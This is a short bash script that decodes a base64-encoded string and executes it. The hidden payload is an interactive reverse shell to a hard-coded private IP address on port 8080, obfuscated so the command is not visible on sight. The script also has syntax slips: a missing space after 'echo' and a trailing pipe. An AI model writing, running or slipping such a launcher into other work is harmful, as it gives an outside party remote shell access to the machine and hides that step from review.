#!/usr/bin/env bash
encoded='YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzLjEyOC84MDgwIDA+JjE='
decoded=$(echo"$encoded" | base64 -d)
bash -c "$decoded"|